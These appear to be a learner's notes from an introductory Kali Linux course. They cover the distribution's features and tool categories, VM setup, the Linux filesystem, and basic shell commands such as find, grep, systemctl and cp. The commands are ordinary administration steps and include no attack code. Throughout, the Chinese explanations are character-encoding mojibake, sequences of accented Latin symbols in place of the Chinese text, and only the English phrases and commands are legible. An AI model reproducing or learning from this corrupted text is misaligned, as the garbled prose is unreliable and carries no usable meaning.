# ç¬”è®°ï¼ˆday01-day11)


å°é£ä¾ --04-Kali Linuxçš„ä»‹ç»
### *Day01
1ã€é»‘å®¢æ˜¯21ä¸–çºªæœ€é‡è¦çš„æŠ€èƒ½ï¼ˆLinuxï¼‰
2ã€é“å¾·é»‘å®¢å’Œæ¸—é€æµ‹è¯•
3ã€Linuxä¸ºä»€ä¹ˆæˆä¸ºé»‘å®¢çš„é¦–é€‰
Day02
1. Linuxå’ŒKali Linuxçš„ä»‹ç»
	http://www.ctftools.com/
		Kaliï¼ˆè¿‘äº²ï¼šUbuntuï¼‰
		PentestBox
		Parrot
Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics and Reverse Engineering.
æ¸—é€æµ‹è¯•å¹³å°ï¼Œä¸“ä¸ºé»‘å®¢è®¾è®¡ï¼Œé›†æˆäº†å¤§é‡çš„é»‘å®¢å·¥å…·
åœ¨ä¸åŒçš„ä¿¡æ¯ç¯å¢ƒä¸‹ä»äº‹å¤šç§å®‰å…¨ä»»åŠ¡
	Penetration Testing  -æ¸—é€æµ‹è¯•
	Security Research   -å®‰å…¨çš„ç ”ç©¶ï¼ˆæµ‹è¯•ï¼‰
	Computer Forensics  --è®¡ç®—æœºç”µå­å–è¯
	Reverse Engineering---é€†å‘å·¥ç¨‹
	Security Auditing  ---å®‰å…¨å®¡è®¡
ï¼ˆ1ï¼‰å†å²
	å‰èº« BackTrack Linux ï¼ˆBTï¼‰
    ç¬¬ä¸€ç‰ˆ 2013.3
ï¼ˆ2ï¼‰Kali Linux Featuresï¼ˆç‰¹æ€§ï¼‰

	1ï¼‰More than 600 penetration testing tools included:
	   600å¤šä¸ªæ¸—é€æµ‹è¯•å·¥å…·
	   https://tools.kali.org/
	   https://tools.kali.org/tools-listing
	   å·¥å…·çš„åˆ†ç±»ï¼š
	   Information Gathering --ä¿¡æ¯æœé›†
	   Vulnerability Analysis --æ¼æ´ï¼ˆè„†å¼±æ€§ï¼‰åˆ†æ
	   Wireless Attacks ---æ— çº¿æ”»å‡»
	   Web Applications ---Web åº”ç”¨
	   Exploitation Tools--æ¼æ´åˆ©ç”¨å·¥å…·
	   Forensics Tools--ç”µå­å–è¯
	   Stress Testing---å‹åŠ›æµ‹è¯•
	   Sniffing & Spoofing---å—…æ¢ & æ¬ºéª—
	   Password Attacks---å¯†ç æ”»å‡»
	   Maintaining Access--ç»´æŒè®¿é—®
	   Reverse Engineering--é€†å‘å·¥ç¨‹
	   Hardware Hacking--ç¡¬ä»¶ç ´è§£
	   Reporting Tools--æŠ¥å‘Šå·¥å…·
	2ï¼‰Free (as in beer) and always will be:
		æ°¸è¿œå…è´¹
		
	3ï¼‰Open source Git tree
		æºä»£ç åœ¨Gitä»“åº“ä¸­å¯ä»¥è·å–
		Git æ˜¯ Linus Torvalds ä¸ºäº†å¸®åŠ©ç®¡ç† Linuxå†…æ ¸å¼€å‘è€Œå¼€å‘çš„ä¸€ä¸ªå¼€æ”¾æºç çš„ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ã€‚
		https://github.com/
		
	4ï¼‰FHS compliant
		ä¸FHSï¼ˆæ–‡ä»¶ç³»ç»Ÿå±‚æ¬¡æ ‡å‡†ï¼‰å…¼å®¹
		
	5ï¼‰Wide-ranging wireless device support:
	    å¹¿æ³›çš„æ— çº¿è®¾å¤‡ï¼ˆç½‘å¡ï¼‰çš„æ”¯æŒ
	
	6ï¼‰Custom kernel, patched for injection
	   å†…æ ¸çš„å®šåˆ¶ï¼Œè¡¥ä¸çš„æ³¨å…¥
	
	7ï¼‰Developed in a secure environment
		åœ¨ä¸€ä¸ªå®‰å…¨çš„ç¯å¢ƒä¸­å¼€å‘
	8ï¼‰GPG signed packages and repositories
	
	   è½¯ä»¶åŒ…å’Œè½¯ä»¶ä»“åº“éƒ½æ˜¯ç»è¿‡GPGç­¾å
	9ï¼‰Multi-language support:
	   æ”¯æŒå¤šç§è¯­è¨€
	   
	10ï¼‰Completely customizable:
	   æ”¯æŒå®Œå…¨å®šåˆ¶
	   
	11ï¼‰ARMEL and ARMHF support
	    ARMå¤„ç†å™¨çš„æ”¯æŒ
		å…¸å‹çš„è®¾å¤‡å¦‚ Raspberry Piï¼ˆæ ‘è“æ´¾ï¼‰
	   
æ²¡æœ‰æ€»ç»“å°±æ²¡æœ‰æé«˜	   
	   
### Day03
1.Kali Linuxçš„å®‰è£…

PS1:åœ¨Biosä¸­å¼€å¯CPUè™šæ‹ŸåŒ–åŠŸèƒ½
PS2ï¼šå®‰è£…é•œåƒ

æ¨èçš„é…ç½®ï¼ˆæœ€å°ï¼‰ï¼š
RAM: 2GB
Hard disk: 60GB
CPU: 2ä¸ªæ ¸å¿ƒ
ç½‘ç»œç±»å‹ï¼šNAT
		192.168.*.0/24
		ç½‘å…³ï¼š192.168.*.2
è™šæ‹Ÿæœºä¸Šç½‘ï¼ˆIPåœ°å€è‡ªåŠ¨è·å–ï¼‰
	æœåŠ¡ç®¡ç†å·¥å…·ï¼šservices.msc
		VMware DHCP Service
		VMware NAT Service
ä¸»æœºåï¼š*.qwfy.org 

PS3ï¼š å»ºè®®å¤§å®¶å»åˆ›å»ºä¸€ä¸ªä¸“ç”¨çš„å®éªŒæ–‡ä»¶å¤¹ï¼ˆè‹±æ–‡å‘½åï¼‰

	å¦‚ï¼š01-Lab
Step01: åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœº


Ctrl+ALT+F2--åˆ‡æ¢åˆ°æ§åˆ¶å°ï¼ˆå¦ä¸€ä¸ªç»ˆç«¯ï¼‰
Ctrl+ALT+F5--å›åˆ°å›¾å½¢çª—å£
ip a æŸ¥çœ‹IPåœ°å€
ip r æŸ¥çœ‹è·¯ç”±
cat /etc/resolv.conf æŸ¥çœ‹DNS
ping -c 1 g.cn
  -c  æŒ‡å‘åŒ…çš„ä¸ªæ•°

### Day04	   
4.1. Introductory Terms and Concepts
å¸¸ç”¨çš„æœ¯è¯­å’Œæ¦‚å¿µ
ï¼ˆ1ï¼‰Binaries
	äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯æ‰§è¡Œï¼Œç±»ä¼¼äºWindowsä¸­çš„*.exeæ–‡ä»¶
	ä½ç½® /usr/bin---æ™®é€šç¨‹åºï¼Œå¦‚cat
		 /usr/sbin--ç®¡ç†ç¨‹åºï¼Œå¦‚haltï¼ˆå…³æœºï¼‰
ï¼ˆ2ï¼‰Case sensitivity
		åŒºåˆ†å¤§å°å†™
		
ï¼ˆ3ï¼‰Directory
		ç›®å½•
ï¼ˆ4ï¼‰Home 
	æ¯ä¸ªæ™®é€šç”¨æˆ·åœ¨/homeç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„å®¶ç›®å½•
	~ è¡¨ç¤ºå®¶
	cd ~ æˆ– cd
	 è¿”å›åˆ°å®¶ç›®å½•
	cd ~/xiaofeixia å›åˆ°å½“å‰ç”¨æˆ·å®¶ç›®å½•ä¸‹çš„xiaofeixiaç›®å½•
	cd ~xiaofeixia  å›åˆ°xiaofeixiaç”¨æˆ·çš„å®¶ç›®å½•
ï¼ˆ5ï¼‰root
	Linuxä¸‹çš„ç®¡ç†å‘˜ï¼ˆè¶…çº§ç”¨æˆ·ï¼‰
	/root ---rootç”¨æˆ·çš„å®¶ç›®å½•
	
	sudo su -  åˆ‡æ¢åˆ°ç®¡ç†å‘˜ï¼ˆææƒï¼‰  ç›¸å½“äº sudo su - root
		su åˆ‡æ¢ç”¨æˆ·èº«ä»½ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šç”¨æˆ·ï¼Œé»˜è®¤å°±æ˜¯rootç”¨æˆ·
		å‘½ä»¤ï¼šsu  -  ç”¨æˆ·
		- è¡¨ç¤ºåˆ‡æ¢åˆ°ç”¨æˆ·çš„å·¥ä½œç¯å¢ƒ
ï¼ˆ6ï¼‰Script
	 è„šæœ¬ï¼Œå°±æ˜¯ä¸€æ®µå¯æ‰§è¡Œçš„ä»£ç 
	 è®¸å¤šé»‘å®¢å·¥å…·éƒ½æ˜¯ä¸€æ®µç®€å•çš„è„šæœ¬
	 scripting language interpreters, such as Python, Perl, or Ruby.
	 å¸¸ç”¨çš„è„šæœ¬è¯­è¨€ï¼šshellã€Pythonã€Perlã€Rubyç­‰
	 Python æ˜¯ç›®å‰é»‘å®¢ä¸­æœ€å—æ¬¢è¿çš„è„šæœ¬è¯­è¨€
ï¼ˆ7ï¼‰Shell
    Shell è¿™æ˜¯ä¸€ä¸ªåœ¨ Linux ä¸­è¿è¡Œå‘½ä»¤çš„ç¯å¢ƒå’Œè§£é‡Šå™¨
	å¸¸ç”¨çš„Shellæ˜¯Bash
	
	echo $SHELL  
	echo $å˜é‡å
	zshæ˜¯Kali 2021é»˜è®¤çš„shell
ï¼ˆ8ï¼‰Terminal-ç»ˆç«¯ This is a command line interface (CLI).
   ç»ˆç«¯å°±æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œæ¥å£
	PS1:åœ¨Kaliä¸­æ‰“å¼€ç»ˆç«¯
	Ctrl+ALT+T

	
æ•™å¾’
	

PS2:sudo--æˆæƒç®¡ç†å·¥å…·
sudo -l æŸ¥çœ‹æˆæƒåˆ—è¡¨
åœ¨æ‰§è¡Œsudoå‘½ä»¤æ—¶ï¼Œé»˜è®¤ä¼šå¯¹å½“å‰ç”¨æˆ·èº«ä»½è¿›è¡ŒéªŒè¯

ç”¨æˆ· xiaofeixia å¯ä»¥åœ¨ kali2 ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
    (ALL : 	ALL) ALL

xiaofeixiaç”¨æˆ·å¯ä»¥ä»¥æ‰€ç”¨æˆ·èº«ä»½åœ¨å½“å‰ä¸»æœºè¿è¡Œæ‰€æœ‰å‘½ä»¤ï¼ˆå…·å¤‡å®Œå…¨ç®¡ç†æƒé™ï¼‰

sudo å‘½ä»¤ï¼Œé»˜è®¤å°±æ˜¯ä»¥rootç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œç›¸å½“äºsudo -u root  å‘½ä»¤
å¦‚sudo init 0 ï¼ˆå…³æœºï¼‰

PS3:æ¸…å± ctrl+l

PS4: cd -
     è¿”å›åˆ°ä¸Šæ¬¡å·¥ä½œç›®å½•
	 cd ~
	 è¿”å›åˆ°å®¶ç›®å½•

### Day05
1.ä½¿ç”¨è™šæ‹Ÿæœºæ–‡ä»¶éƒ¨ç½²Kali Linux

default credentials "kali/kali".

*.vmx
	è™šæ‹Ÿæœºé…ç½®æ–‡ä»¶
*.vmdk
	è™šæ‹Ÿæœºç¡¬ç›˜æ–‡ä»¶


 sudo passwd root   
 
 2. A Tour of Kali--Kaliä¹‹æ—…
 
 2.1. passwd
 
 passwd  æ›´æ”¹å¯†ç 
	-S  æŸ¥çœ‹ç”¨æˆ·å¯†ç çš„çŠ¶æ€
	-l, --lock                    é”å®šæŒ‡å®šçš„å¸æˆ·
	-u, --unlock                  è§£é”è¢«æŒ‡å®šå¸æˆ·


 ç”¨æˆ·å¯†ç æ–‡ä»¶ /etc/shadow
 ç”¨æˆ·è´¦æˆ·æ–‡ä»¶ /etc/passwd 

2.2 Linuxæ–‡ä»¶ç³»ç»Ÿ

Linuxåªæœ‰ä¸€ä¸ªæ ¹ï¼ˆ/ï¼‰
æ ¹æ˜¯æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„å…¥å£ï¼ˆèµ·å§‹ä½ç½®ï¼‰
ä»æ ¹å¼€å§‹æè¿°çš„è·¯å¾„å°±ç§°ä¸ºç»å¯¹è·¯å¾„
/root rootç”¨æˆ·çš„å®¶ç›®å½•
/boot å¼•å¯¼æ–‡ä»¶å’Œå†…æ ¸æ–‡ä»¶
/home 
/etc  ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶
/mnt  å¸¸ç”¨çš„æŒ‚è½½ç‚¹ï¼ˆmount pointï¼‰--æ–‡ä»¶ç³»ç»Ÿ
  å¯¹äºï¼ˆå¤–éƒ¨ï¼‰è®¾å¤‡çš„è®¿é—®éœ€è¦è¿›è¡ŒæŒ‚è½½æ‰å¯ä»¥è®¿é—®
  æŒ‚è½½ï¼ˆmountï¼‰å°±æ˜¯æŠŠä¸€ä¸ªè®¾å¤‡ï¼ˆæ–‡ä»¶ç³»ç»Ÿï¼‰å’Œä¸€ä¸ªç›®å½•å…³è”
  
	mount è®¾å¤‡ï¼ˆæ–‡ä»¶ç³»ç»Ÿï¼‰ ç›®å½•
	mount /dev/cdrom /mnt
  å¸è½½
	umount è®¾å¤‡  æˆ–
	umount æŒ‚è½½ç‚¹
/media  å¸¸ç”¨çš„æŒ‚è½½ç‚¹--å¤–éƒ¨ç§»åŠ¨è®¾å¤‡ï¼Œå¦‚Uç›˜ã€å…‰ç›˜
/dev  è®¾å¤‡æ–‡ä»¶ç›®å½•  
	å¦‚/dev/cdrom å…‰ç›˜
	  /dev/sda  ç¬¬ä¸€å—scsiæ¥å£çš„ç¡¬ç›˜
	  /dev/sda1 ç¬¬ä¸€å—scsiæ¥å£çš„ç¡¬ç›˜ç¬¬ä¸€ä¸ªåˆ†åŒº
	  /dev/sdb
/proc  è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œåæ˜ çš„æ˜¯å†…æ ¸å†…éƒ¨çš„æ•°æ®ä¿¡æ¯
/sys  å†…æ ¸å…³äºç¡¬ä»¶çš„æ•°æ®ä¿¡æ¯
/bin---æ™®é€šç¨‹åº
/sbin--ç®¡ç†ç¨‹åº
/lib  --åº“æ–‡ä»¶ï¼ˆç›¸å½“äºWindowsä¸­çš„dllæ–‡ä»¶ï¼‰
/usr   --é¢å‘ç”¨æˆ·çº§
	/usr/bin
	/usr/sbin
	/usr/lib
PS1:df
	æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿ
	df -T -h
	-T  æ–‡ä»¶ç³»ç»Ÿç±»å‹
	-h  ä»¥é€‚åˆçš„å®¹é‡å•ä½æ˜¾ç¤º
	
ls /dev/cdrom
	


### Day06
Basic Commands in Linux

?å“ªä¸ªç›®å½•å¸¸ç”¨äºå­˜å‚¨é…ç½®æ–‡ä»¶ï¼Ÿ/etc

6.1 åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„å·¥ä½œç›®å½•

mkdir -pv work/{doc,app,bak,script,exam} 

mkdir -p test/{1..100}
mkdir {a..d} 


work/
  doc---æ–‡æ¡£
  app---åº”ç”¨
  bak---å¤‡ä»½
  script--è„šæœ¬
  exam--ç»ƒä¹ 



mkdir åˆ›å»ºç›®å½•
	-p, --parents     éœ€è¦æ—¶åˆ›å»ºç›®æ ‡ç›®å½•çš„ä¸Šå±‚ç›®å½•ï¼Œä½†å³ä½¿è¿™äº›ç›®å½•å·²å­˜åœ¨
                      ä¹Ÿä¸å½“ä½œé”™è¯¯å¤„ç†


ls -ld dir1 æŸ¥çœ‹ç›®å½•æœ¬èº«çš„å±æ€§
ls -l dir1  æŸ¥çœ‹ç›®å½•ä¸‹å¯¹è±¡å±æ€§

rm -rf dir1  åˆ é™¤ç›®å½•


6.2. Finding Yourself with pwd

pwd 
	æŸ¥çœ‹å½“å‰æ‰€å¤„çš„ä½ç½®
    æ‰“å°å½“å‰å·¥ä½œç›®å½•
	
PS: ç›¸å¯¹è·¯å¾„ï¼ˆä»å½“å‰å·¥ä½œç›®å½•æè¿°çš„è·¯å¾„ï¼‰
	cd work/exam
	
6.3. Checking Your Login with whoami

whoami  
	æŸ¥çœ‹å½“å‰ç”¨æˆ·ï¼ˆæˆ‘æ˜¯è°ï¼‰
	
6.4. Navigating the Linux Filesystem

Changing Directories with cd

cd ..  è¿”å›ä¸Šä¸€çº§ç›®å½•
cd .    è¿˜æ˜¯åœ¨å½“å‰ç›®å½•
cd ./work   è¿›å…¥åˆ°å½“å‰ç›®å½•ä¸‹çš„workç›®å½•
cd ../..    è¿”å›åˆ°ä¸Šä¸€çº§ç›®å½•çš„ä¸Šä¸€çº§ç›®å½•
cd ../../..
cd  -
cd ~  | cd
cd ~xiaofeixia
cd ~/xiaofeixia

6.5. Listing the Contents of a Directory 
åˆ—å‡ºç›®å½•å†…å®¹
ls  
ls -l  é•¿æ ¼å¼æ˜¾ç¤º
ls -la æ˜¾ç¤ºéšè—æ–‡ä»¶
ls -ld work

6.6. Getting Help
è·å–å¸®åŠ©

eg1:
aircrack-ng --help
	æ— çº¿ç ´è§£å·¥å…·
æˆ–è€…
eg2
nmap -h
	è‘—åçš„ç½‘ç»œæ‰«æå·¥å…·
eg3
man ï¼ˆmanual ï¼‰æŸ¥çœ‹è”æœºæ‰‹å†Œ
	G å›åˆ°æ‰‹å†Œæœ€åä¸€è¡Œ
	gg å›åˆ°æ‰‹å†Œç¬¬ä¸€è¡Œ
	/å…³é”®å­— å‘ä¸‹æ ¹æ®å…³é”®å­—æŸ¥æ‰¾
	å¦‚/EXAMPLESï¼ˆä¾‹å­ï¼‰
	q é€€å‡º


PS1
shellä¸­å¸¸ç”¨å¿«æ·é”®
ctrl+w  åˆ é™¤å…‰æ ‡å·¦ä¾§çš„å•è¯
ctrl+A  å›åˆ°è¡Œé¦–
ctrl+e  å›åˆ°è¡Œå°¾



### Day07
Finding Stuff  //æŸ¥æ‰¾

7.1. Searching with locate
locate
æ ¹æ®å…³é”®å­—åœ¨æ•´ä¸ªLinuxæ–‡ä»¶ç³»ç»Ÿä¸­æŸ¥æ‰¾ï¼ˆå®šä½ï¼‰ç›¸å…³çš„æ–‡ä»¶
ç”¨æ³•ï¼š locate å…³é”®å­—
ï¼ˆ1ï¼‰åŸºäºè‡ªå·²çš„æ•°æ®åº“å¯¹æ–‡ä»¶è¿›è¡ŒæŸ¥æ‰¾
ï¼ˆ2ï¼‰ä¼šæŠŠåŒ¹é…çš„æ–‡ä»¶å…¨éƒ¨ç»™å‡º
ï¼ˆ3ï¼‰å»ºè®®åœ¨ä½¿ç”¨locateä¹‹å‰å¯ä»¥ä½¿ç”¨updatedbæ‰‹åŠ¨æ›´æ–°
	æ•°æ®åº“ï¼ˆ/var/lib/mlocate/mlocate.dbï¼‰
locate aircrack-ng
locate passwd | more

7.2. Finding Binaries with whereis
ä½¿ç”¨whereisæŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ã€åº“æ–‡ä»¶

7.3. Finding Binaries in the PATH Variable with which

ä½¿ç”¨whichåœ¨PATHå˜é‡ä¸­æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶

PS1: PATHå˜é‡
ï¼ˆ1ï¼‰è·¯å¾„æœç´¢å˜é‡
ï¼ˆ2ï¼‰æŸ¥çœ‹å˜é‡  echo $å˜é‡å
	echo $PATH
ï¼ˆ3ï¼‰è·¯å¾„ä¹‹é—´ç”¨:åˆ†éš”
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
ï¼ˆ4ï¼‰ä½œç”¨
 å½“æ‰§è¡Œä¸€ä¸ªï¼ˆå¤–éƒ¨ï¼‰å‘½ä»¤ç¨‹åºæ—¶ï¼Œä¼šåœ¨PATHå˜é‡ä¸­æŸ¥æ‰¾æœ‰æ— è¿™ä¸ªç¨‹åº
 cd /root/work/exam
 pwd 
 cat /etc/resolv.conf
 which cat
 type cat
  echo $PATH
 mv /usr/bin/cat   .
 ls
 cat /etc/resolv.conf
 which cat
 ls  
 /root/work/exam/cat /etc/resolv.conf
 mv cat /usr/bin
 cat /etc/resolv.conf 


PS2:typeåˆ¤å®šå‘½ä»¤ç¨‹åºæ˜¯å†…éƒ¨å‘½ä»¤è¿˜æ˜¯å¤–éƒ¨å‘½ä»¤

7.4. Performing More Powerful Searches with find
æœç´¢åŠŸèƒ½å¼ºå¤§çš„findå‘½ä»¤

æŸ¥æ‰¾çš„æ¡ä»¶
	æ–‡ä»¶çš„ç±»å‹ã€åç§°ã€å±ä¸»ã€å±ç»„ã€å¤§å°ã€åˆ›å»ºï¼ˆæˆ–ä¿®æ”¹ï¼‰æ—¶é—´ã€æƒé™ç­‰
	
åŸºæœ¬è¯­æ³• 
	find directory options expression
	find  è·¯å¾„  é€‰é¡¹    è¡¨è¾¾å¼
ex01
	find / -type f  -name apache2
ex02 
   find /etc -type f  -name apache2
	
	
-type  æ–‡ä»¶çš„ç±»å‹ï¼Œ f è¡¨ç¤ºæ™®é€šæ–‡ä»¶ï¼Œdè¡¨ç¤ºç›®å½•
-name  æ–‡ä»¶çš„åç§°ï¼Œå¯ä»¥æ”¯æŒé€šé…ç¬¦
Wildcards come in a few different forms: * . , ? and [].
å¸¸ç”¨çš„é€šé…ç¬¦æœ‰
*  ä»»æ„ï¼ˆ0ä¸ªæˆ–å¤šä¸ªï¼‰å­—ç¬¦
ï¼Ÿ å•ä¸ªå­—ç¬¦
[] ä¸€ä¸ªåˆ—è¡¨
ex03
  find / -type f  -name apache2*
  find /etc -type f  -name apache2?????

  apache2.conf
	



touch a1 a2 a3 a4 a5 a100
find .  -name "a?"
find .  -name "a[1,3,5]"

### Day08
8.1. å¿«é€Ÿç†è§£é€šé…ç¬¦

å¸¸ç”¨çš„é€šé…ç¬¦æœ‰
*  ä»»æ„ï¼ˆ0ä¸ªæˆ–å¤šä¸ªï¼‰å­—ç¬¦
	which matches any character(s) of any length, from none toan unlimited number of characters.
ï¼Ÿ å•ä¸ªå­—ç¬¦
[] ä¸€ä¸ªåˆ—è¡¨ï¼ŒåŒ¹é…åˆ—è¡¨ä¸­çš„ä»»æ„å•ä¸ªå­—ç¬¦

find .  -name "?at"
find .  -name "[bc]at"
find .  -name "[b-c]at"
find .  -name "[b,c]at"
find .  -name "*at" 

8.2.  Filtering with grep
ä½¿ç”¨grepå»åšæ–‡æœ¬çš„è¿‡æ»¤
åœ¨æ¯ä¸ª<æ–‡ä»¶>ä¸­æŸ¥æ‰¾ç»™å®š<æ¨¡å¼>ã€‚ä¹Ÿå¯ä»¥å¯¹æ¥è‡ªå¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºåšè¿‡æ»¤

ç”¨æ³•: grep [é€‰é¡¹]... æ¨¡å¼ [æ–‡ä»¶]...


ï¼ˆ1ï¼‰å¸¸ä¸ç®¡é“ç¬¦ï¼ˆ|ï¼‰ç»“åˆåœ¨ä¸€èµ·ä½¿ç”¨

ps aux | grep apache2

ls /usr/bin  | grep zip

ï¼ˆ2ï¼‰å¸¸ç”¨çš„å‘½ä»¤é€‰é¡¹

1ï¼‰grep --help
2ï¼‰ -r, --recursive
   é€’å½’
ls -R /usr | grep zip

mkdir -pv 01/001/0001 
echo xiaofeixia is very great  >01/test01.txt 
echo xiaofeixia is very great  >01/001/test001.txt
echo xiaofeixia is very great  >01/001/0001/test0001.txt
grep xiaofeixia 01
grep -r xiaofeixia 01 

3ï¼‰-i  å¿½ç•¥å¤§å°å†™

 echo XIAOFEIXIA is very great  >01/001/0001/test0002.txt
 grep -r  -i xiaofeixia 01



PS1:ç®¡é“ç¬¦ï¼ˆ|ï¼‰
	æŠŠå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºå½“ä½œåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ï¼Œå¸¸ç”¨äºè¿æ¥å¤šä¸ªå‘½ä»¤

PS2: æŸ¥çœ‹ç«¯å£
 netstat -tunlp
	-t  tcp
	-u  udp
	-n  æ•°å­—å½¢å¼æ˜¾ç¤º
	-l, --listening          display listening server sockets
	   æ˜¾ç¤ºå½“å‰æ­£åœ¨ç›‘å¬çš„ç«¯å£
	-p  å“ªä¸ªç¨‹åºï¼ˆè¿›ç¨‹ï¼‰åœ¨ä½¿ç”¨è¯¥ç«¯å£
PS3:WebæœåŠ¡ç¨‹åº--apache2
å¯åŠ¨WebæœåŠ¡

systemctl start apache2

PS4: ps  aux   æ˜¾ç¤ºæ‰€æœ‰ç³»ç»Ÿæ­£åœ¨è¿è¡Œè¿›ç¨‹


PS5: systemctl ç³»ç»ŸæœåŠ¡æ§åˆ¶å·¥å…·
systemctl [OPTIONS...] COMMAND ...


  systemctl å‘½ä»¤  æœåŠ¡åç§°
  
  å¸¸ç”¨çš„å‘½ä»¤ï¼š
	start å¯åŠ¨
	stop  åœæ­¢
	restart é‡å¯
	enable æŠŠæœåŠ¡è®¾ç½®å¼€æœºå¯åŠ¨
	disable æŠŠæœåŠ¡è®¾ç½®ä¸ºå¼€æœºä¸å¯åŠ¨
	is-enabled æŸ¥è¯¢æœåŠ¡æ˜¯å¦è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨
	status æŸ¥è¯¢æœåŠ¡çš„çŠ¶æ€
	
	systemctl start apache2

PS6ï¼š echo $?   
	æŸ¥çœ‹å‘½ä»¤çš„æ‰§è¡ŒçŠ¶æ€
	æ­£ç¡®æ‰§è¡Œä¸º0ï¼Œå¦åˆ™å°±æ˜¯é”™è¯¯çš„

PS7ï¼š SSHæœåŠ¡
	  å¸¸ç”¨äºè¿œç¨‹è¿æ¥ï¼ˆå®‰å…¨ï¼‰
	  ç«¯å£å· tcp/22
	  systemctl start ssh     å¼€å¯SSHæœåŠ¡
	  ps aux | grep sshd  
	  netstat -tunlp | grep 22
PS8: !n
     è°ƒç”¨æœ€è¿‘ä¸€æ¬¡ä»¥næ‰“å¤´çš„æŒ‡ä»¤



PS9ï¼šæŸ¥çœ‹è¿›ç¨‹æ ‘ pstree

pstree | grep apache2

### Day09
æ–‡ä»¶å’Œç›®å½•çš„åŸºæœ¬æ“ä½œ

9.1. Creating Files æ–‡ä»¶çš„åˆ›å»º

ï¼ˆ1ï¼‰cat 
concatenateï¼ˆè¿æ¥ï¼‰çš„ç¼©å†™ï¼Œå³combine pieces together
1ï¼‰æŠŠç¢ç‰‡ç»„åˆåœ¨ä¸€èµ·ï¼ˆæ„å‘³ç€å¯ä»¥ä½¿ç”¨catåˆ›å»ºä¸€ä¸ªå°æ–‡ä»¶ï¼‰
2ï¼‰æ˜¾ç¤ºæ–‡ä»¶
	-n  æ˜¾ç¤ºè¡Œå·

cat > æ–‡ä»¶ 
å†…å®¹
â€¦â€¦
ctrl+d  é€€å‡º

PS1: é‡å®šå‘
>  è¦†ç›–
>> è¿½åŠ 


PS2: Bashå°æŠ€å·§

ESC+. ï¼ˆæˆ–!$ï¼‰ è°ƒç”¨ä¸Šä¸€ä¸ªå‘½ä»¤çš„å‚æ•°

æ‰©å±•ï¼šåœ¨è„šæœ¬ä¸­ä½¿ç”¨catåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼ˆéäº¤äº’å¼ï¼‰

cat > catfile << EOF
æ–‡ä»¶çš„å†…å®¹
EOF
PS:EOFè¡¨ç¤ºè¾“å…¥åˆ°æ­¤ç»“æŸï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–å­—ç¬¦æˆ–ç¬¦å·

#!/bin/bash
by xiaofeixia
Function: This is cat example
echo "This is use cat to create file example"
cat > catfile << EOF
æ–‡ä»¶çš„å†…å®¹
EOF
ls catfile
cat -n catfile
æ¡ˆä¾‹2

cat > catfile2 << EOF
å†…å®¹
EOF


è„šæœ¬çš„ä¾‹å­ï¼š
1ï¼‰åˆ›å»ºæˆ‘çš„ç¬¬ä¸€ä¸ªè„šæœ¬

#!/bin/bash  ç¬¬ä¸€è¡Œ
	//#!å‘Šè¯‰ç³»ç»Ÿè„šæœ¬å°†ä¼šä½¿ç”¨å“ªä¸ªè§£é‡Šå™¨
	//bashæ˜¯å¸¸ç”¨çš„ä¸€ç§shellå‘½ä»¤è§£é‡Šå™¨ï¼Œè·¯å¾„ä¸º/bin/bash

å‘½ä»¤

#!/bin/bash

echo "Hello,Hacker-Arise"




2ï¼‰ç»™è„šæœ¬æ·»åŠ å¯æ‰§è¡Œæƒé™
æ‰§è¡Œä½  x 

chmod +x  è„šæœ¬æ–‡ä»¶

chmod  æ›´æ”¹æƒé™

3ï¼‰æ‰§è¡Œè„šæœ¬
./ex02.sh
day09/ex02.sh
/root/work/exam/day09/ex02.sh 
sh /root/work/exam/day09/ex02.sh 





ï¼ˆ2ï¼‰viå»åˆ›å»ºä¸€ä¸ªæ–‡ä»¶
File Creation with touch

ï¼ˆ2ï¼‰File Creation with touch
ä½¿ç”¨touch åˆ›å»º æ–‡ä»¶



### Day10
10.1 File Creation with touch

ä½¿ç”¨touch åˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶

è¿™ä¸ªå‘½ä»¤æœ€åˆæ˜¯ä¸ºäº†è®©ç”¨æˆ·å¯ä»¥ç®€å•åœ°è§¦æ‘¸ä¸€ä¸ªæ–‡ä»¶æ¥æ›´æ”¹å®ƒçš„ä¸€äº›ç»†èŠ‚ï¼Œæ¯”å¦‚åˆ›å»ºæˆ–ä¿®æ”¹çš„æ—¥æœŸã€‚ä½†æ˜¯ï¼Œå¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¯¥å‘½ä»¤ä¼šé»˜è®¤åˆ›å»ºè¯¥æ–‡ä»¶

10.2. Creating a Directory
mkdir  åˆ›å»ºç›®å½•
	-pv

mkdir -p dir{1..10}/{ah,sd,sc}xh/dir{1..100}

10.3 å¤åˆ¶æ–‡ä»¶--cp

  Copying a File
  
  cp  æº  ç›®æ ‡
  
  cp oldfile /root/work/exam/day10/dir1/
  cp oldfile /root/work/exam/day10/dir1/newfile
  
  cp oldfile dir2/
  cp oldfile dir2/newfile
  
  
  cp oldfile f1 dir3/ 
  //æŠŠoldfileå’Œf1å¤åˆ¶åˆ°dir3ç›®å½•ä¸‹
  æœ€åä¸€ä¸ªæ˜¯ç›®æ ‡ï¼Œä¸”ç›®æ ‡åº”è¯¥ä¸ºç›®å½•
  
